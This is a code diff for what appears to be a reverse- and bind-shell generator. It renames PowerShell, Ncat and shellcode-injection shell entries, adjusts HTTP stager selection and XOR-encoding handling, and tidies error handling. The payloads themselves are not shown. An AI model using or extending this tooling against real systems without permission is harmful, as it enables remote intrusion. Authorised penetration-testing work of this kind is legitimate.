@@ -18,7 +18,6 @@
 import urllib
 import pyperclip
 import os
-import string
 import netifaces
 from sys import exit
 from argparse import ArgumentParser
@@ -158,7 +157,7 @@ AVAILABLE_SHELLS = [
                 use_handler=None,
                 use_http_stager=LINUX_STAGERS),
 
-            14: Shell("Powershell TCP",
+            14: Shell("Windows Powershell TCP",
                 "bind",
                 "tcp",
                 BIND_POWERSHELL_TCP(),
@@ -242,7 +241,7 @@ AVAILABLE_SHELLS = [
                 use_handler=reverse_tcp_handler,
                 use_http_stager=LINUX_STAGERS),
 
-            9: Shell("Powershell TCP",
+            9: Shell("Windows Powershell TCP",
                 "reverse",
                 "tcp",
                 REV_POWERSHELL_TCP(),
@@ -350,16 +349,16 @@ AVAILABLE_SHELLS = [
                 use_handler=None,
                 use_http_stager=LINUX_STAGERS),
             
-            21: Shell("Windows Ncat TCP",
+            21: Shell("Windows Ncat TCP - x64",
                 "reverse",
                 "tcp",
                 REVERSE_WINDOWS_NCAT_TCP(),
                 os="Windows",
                 arch="x64",
                 use_handler=reverse_tcp_handler,
-                use_http_stager=WINDOWS_STAGERS),
+                use_http_stager=list(filter(lambda x: x[0] not in [1,3], WINDOWS_STAGERS )) ),
 
-            22: Shell("Windows Bloodseeker TCP",
+            22: Shell("Windows Powershell Shellcode-Injection a.k.a BloodSeeker TCP - x64",
                 "reverse",
                 "tcp",
                 REVERSE_WINDOWS_BLOODSEEKER_TCP(),
@@ -401,15 +400,6 @@ def list_shells():
         obj = reverse_shells[i]
         print("{0}. {1}".format(str(i).rjust(3), proto_colorize(obj.name)))
     return 0
-
-
-def generate_file_name(extension=""):
-    file_name = ""
-    while len(file_name) < 8:
-        random_char = os.urandom(1)
-        if random_char in string.letters:
-            file_name += random_char
-    return file_name + extension
 
 
 def header():
@@ -563,13 +553,20 @@ def main():
                 for port in ports:
                     stager = HTTPServer(port)
                     if stager.check_port() is True:
-
+                        # This check is needed because --xor for windows is only available with powershell.
+                        if args.xor != 0 and "powershell" in shell.name.lower():
+                            # Windows Powershell XOR encoding will only work with Powershell HTTP staging.
+                            shell.use_http_stager = [(1, Powershell_HTTP_Stager)]
+                        
                         # Choose the stager option
                         if len(shell.use_http_stager) == 1:
                             shell.use_http_stager = shell.use_http_stager[0][1]
                         else:
                             shell.use_http_stager = choose_stager(shell.use_http_stager) # choose a stager.
-
+                            if shell.use_http_stager is None:
+                                # Make sure there is a selected staging option.
+                                print(error("You have selected an invalid staging option."))
+                                exit(1)
                         stager_thread = Process(target=stager.start, args=())
                         stager_thread.start()
                         print(info("Started HTTP server at port {0}".format(port)))
@@ -604,7 +601,7 @@ def main():
         try:
             while 1:
                 sleep(10)
-        except:
+        except KeyboardInterrupt:
             print(info("Killing HTTP server ..."))
             stager_thread.terminate()
             os.chdir(OLD_DIR) # restore working directory.
